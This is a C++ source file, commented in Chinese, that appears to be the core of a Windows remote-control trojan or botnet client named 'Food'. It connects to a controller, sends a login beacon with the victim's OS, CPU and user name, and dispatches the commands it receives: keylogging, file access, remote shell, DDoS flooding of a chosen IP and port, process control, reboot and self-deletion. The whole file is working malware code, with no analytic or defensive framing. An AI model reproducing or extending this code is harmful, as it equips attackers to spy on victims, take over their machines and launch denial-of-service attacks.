#include "pch.h"
#include "Food.h"

#pragma warning(disable:4996) // 防止高版本vs编译release版本发生错误
#pragma warning(disable:28159) // 防止高版本vs编译release版本发生错误

Food::Food() {
	CmdDelete = "CMD_DELETE";
	CmdKeybd = "CMD_KEYBD";
	CmdFile = "CMD_FILE";
	CmdShell = "CMD_SHELL";
	CmdDdos = "CMD_DDOS";
	CmdProc = "CMD_PROC";
	CmdSendBox = "SENDBOX";
	CmdReboot = "REBOOT";
	CmdOffline = "OFFLINE";
	CmdLogin = "LOGIN";
	CmdSplit = ";";
	CmdEnd = "\r\n";
}

void Food::connectTo(std::string domain, int port)
{
	// 建立socket连接
	if (!mSock.connectTo(domain, port)) {
		return;
	}

	// 发送登录信息
	if (!sendLogin()) {
		return;
	}

	// 缓冲区 八百八百地收
	const int packetSize = 800;
	char szData[packetSize];
	int ret;

	while (true) {
		ret = mSock.recvData(szData, packetSize);

		if (ret == SOCKET_ERROR || ret == 0) {
			// 连接错误时清除本对象缓存 停止循环
			mBuf.erase(mBuf.begin(), mBuf.end());
			break;
		}

		addDataToBuffer(szData, ret);
	}
}

std::string Food::getUserName()
{
	char szUser[MAX_PATH];
	int size = MAX_PATH;
	GetUserNameA(szUser, (DWORD*)&size);
	return std::string(szUser);
}

std::string Food::getSystemModel()
{
	typedef struct _OSVERSIONINFOEX {
		DWORD dwOSVersionInfoSize;
		DWORD dwMajorVersion;
		DWORD dwMinorVersion;
		DWORD dwBuildNumber;
		DWORD dwPlatformId;
		TCHAR szCSDVersion[128];
		WORD  wServicePackMajor;
		WORD  wServicePackMinor;
		WORD  wSuiteMask;
		BYTE  wProductType;
		BYTE  wReserved;
	} OSVERSIONINFOEX, * POSVERSIONINFOEX, * LPOSVERSIONINFOEX;

	SYSTEM_INFO info;
	GetSystemInfo(&info);
	OSVERSIONINFOEX os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

	std::string osname = "unknown OS";

	if (GetVersionEx((OSVERSIONINFO*)&os))
	{
		switch (os.dwMajorVersion)
		{
		case 4:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
					osname = "Windows NT 4.0";
				else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
					osname = "Windows 95";
				break;
			case 10:
				osname = "Windows 98";
				break;
			case 90:
				osname = "Windows Me";
				break;
			}
			break;

		case 5:
			switch (os.dwMinorVersion)
			{
			case 0:
				osname = "Windows 2000";
				break;

			case 1:
				osname = "Windows XP";
				break;

			case 2:
				if (os.wProductType == VER_NT_WORKSTATION
					&& info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				{
					osname = "Windows XP Professional x64 Edition";
				}
				else if (GetSystemMetrics(SM_SERVERR2) == 0)
					osname = "Windows Server 2003";
				else if (GetSystemMetrics(SM_SERVERR2) != 0)
					osname = "Windows Server 2003 R2";
				break;
			}
			break;

		case 6:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Windows Vista";
				else
					osname = "Windows Server 2008";
				break;
			case 1:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Windows 7";
				else
					osname = "Windows Server 2008 R2";
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Windows 8";
				else
					osname = "Windows Server 2012";
				break;
			case 3:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Windows 8.1";
				else
					osname = "Windows Server 2012 R2";
				break;
			}
			break;

		case 10:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Windows 10";
				else
					osname = "Windows Server 2016 Technical Preview";
				break;
			}
			break;
		}
	}

	return osname;
}

std::string Food::getProcessorInfo() {

	SYSTEM_INFO sinf;
	GetSystemInfo(&sinf);

	// 预设默认值
	TCHAR szCPUArch[64] = TEXT("(unknown)");
	TCHAR szCPULevel[64] = TEXT("(unknown)");
	TCHAR szCPURev[64] = TEXT("(unknown)");

	switch (sinf.wProcessorArchitecture) {
		// Notice that AMD processors are seen as PROCESSOR_ARCHITECTURE_INTEL.
		// In the Registry, the content of the "VendorIdentifier" key under 
		// HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0
		// is either "GenuineIntel" or "AuthenticAMD"
	case PROCESSOR_ARCHITECTURE_INTEL:
		_tcscpy_s(szCPUArch, _countof(szCPUArch), TEXT("Intel"));
		switch (sinf.wProcessorLevel) {
		case 3: case 4:
			StringCchPrintf(szCPULevel, _countof(szCPULevel), TEXT("80%c86"), sinf.wProcessorLevel + '0');
			break;

		case 5:
			_tcscpy_s(szCPULevel, _countof(szCPULevel), TEXT("Pentium"));
			break;

		case 6:
			switch (HIBYTE(sinf.wProcessorRevision)) { // Model
			case 1:
				_tcscpy_s(szCPULevel, _countof(szCPULevel),
					TEXT("Pentium Pro"));
				break;

			case 3:
			case 5:
				_tcscpy_s(szCPULevel, _countof(szCPULevel),
					TEXT("Pentium II"));
				break;

			case 6:
				_tcscpy_s(szCPULevel, _countof(szCPULevel),
					TEXT("Celeron"));
				break;

			case 7:
			case 8:
			case 11:
				_tcscpy_s(szCPULevel, _countof(szCPULevel),
					TEXT("Pentium III"));
				break;

			case 9:
			case 13:
				_tcscpy_s(szCPULevel, _countof(szCPULevel),
					TEXT("Pentium M"));
				break;

			case 10:
				_tcscpy_s(szCPULevel, _countof(szCPULevel),
					TEXT("Pentium Xeon"));
				break;

			case 15:
				_tcscpy_s(szCPULevel, _countof(szCPULevel),
					TEXT("Core 2 Duo"));
				break;

			default:
				_tcscpy_s(szCPULevel, _countof(szCPULevel),
					TEXT("Unknown Pentium"));
				break;
			}
			break;

		case 15:
			_tcscpy_s(szCPULevel, _countof(szCPULevel), TEXT("Pentium 4"));
			break;
		}
		break;

	case PROCESSOR_ARCHITECTURE_IA64:
		_tcscpy_s(szCPUArch, _countof(szCPUArch), TEXT("IA-64"));
		StringCchPrintf(szCPULevel, _countof(szCPULevel), TEXT("%d"), sinf.wProcessorLevel);
		break;

	case PROCESSOR_ARCHITECTURE_AMD64:
		_tcscpy_s(szCPUArch, _countof(szCPUArch), TEXT("AMD64"));
		StringCchPrintf(szCPULevel, _countof(szCPULevel), TEXT("%d"), sinf.wProcessorLevel);
		break;


	case PROCESSOR_ARCHITECTURE_UNKNOWN:
	default:
		_tcscpy_s(szCPUArch, _countof(szCPUArch), TEXT("Unknown"));
		break;
	}
	// 构造返回信息
	std::string proInfo = std::string(szCPUArch) + std::string("架构 ") + std::string(szCPULevel) + 
		std::string(" ") + std::to_string(sinf.dwNumberOfProcessors) + std::string("核心");
	
	return proInfo;
}

bool Food::sendLogin()
{
	std::string data;
	data.append(CmdLogin + CmdSplit);
	data.append("SYSTEM" + CmdSplit + getSystemModel() + CmdSplit);
	data.append("PROCESSOR" + CmdSplit + getProcessorInfo() + CmdSplit);
	data.append("USER_NAME" + CmdSplit + getUserName());
	data.append(CmdEnd);

	return mSock.sendData(data.data(), data.size());
}

void Food::addDataToBuffer(char* data, int size)
{
	mBuf.append(data, size);

	int endIndex;
	// 逐语句拆分为指令与数据 并处理
	while ((endIndex = mBuf.find(CmdEnd)) >= 0) {
		std::string line = mBuf.substr(0, endIndex);
		mBuf.erase(0, endIndex + CmdEnd.length());

		int firstSplit = line.find(CmdSplit);
		std::string cmd = line.substr(0, firstSplit);
		line.erase(0, firstSplit + CmdSplit.length());

		processCmd(cmd, line);
	}
}

void Food::processCmd(std::string& cmd, std::string& data)
{
	std::map<std::string, std::string> args = parseArgs(data);

	if (cmd == CmdSendBox) {
		doSendBox(args);
		return;
	}

	if (cmd == CmdReboot) {
		doReboot();
		return;
	}

	if (cmd == CmdOffline) {
		doOffline();
		return;
	}

	if (cmd == CmdDelete) {
		doDelete();
		return;
	}

	if (cmd == CmdKeybd) {
		doKeybd(args);
		return;
	}

	if (cmd == CmdFile) {
		doFile(args);
		return;
	}

	if (cmd == CmdShell) {
		doShell(args);
		return;
	}

	if (cmd == CmdDdos) {
		doDdos(args);
		return;
	}

	if (cmd == CmdProc) {
		doProc(args);
		return;
	}
}

std::map<std::string, std::string> Food::parseArgs(std::string& data)
{
	std::vector<std::string> v;
	std::string::size_type pos1, pos2;
	pos2 = data.find(CmdSplit);
	pos1 = 0;
	// 将参数名和参数逐一添加到vector
	while (std::string::npos != pos2) {
		v.push_back(data.substr(pos1, pos2 - pos1));
		pos1 = pos2 + CmdSplit.size();
		pos2 = data.find(CmdSplit, pos1);
	}
	if (pos1 != data.length()) v.push_back(data.substr(pos1));
	// 转换我参数名和参数的map形式存储
	std::map<std::string, std::string> args;
	for (int i = 0; i < (int)v.size() - 1; i += 2) {
		args[v.at(i)] = v.at(i + 1);
	}

	return args;
}

void Food::doDelete()
{
	DelSelf();
}

void Food::doKeybd(std::map<std::string, std::string>& args)
{
	Keybd::startKeybd(mSock.mIp, atoi(args["PORT"].data()));
}

void Food::doFile(std::map<std::string, std::string>& args)
{
	File::startByNewThread(mSock.mIp, atoi(args["PORT"].data()));
}

void Food::doShell(std::map<std::string, std::string>& args)
{
	Shell::startShell(mSock.mIp, atoi(args["PORT"].data()));
}

void Food::doDdos(std::map<std::string, std::string>& args)
{
	Ddos::startByNewThread(args["IP"].data(), atoi(args["PORT"].data()));
}

void Food::doSendBox(std::map<std::string, std::string>& args)
{
	MessageBoxA(NULL, args["TEXT"].data(), "Message", MB_OK);
}

void Food::doReboot()
{
	system("shutdown -r -t 1");
}

void Food::doOffline()
{
	ExitProcess((UINT)NULL);
}

void Food::doProc(std::map<std::string, std::string>& args) {
	Proc::startByNewThread(mSock.mIp, atoi(args["PORT"].data()));
}
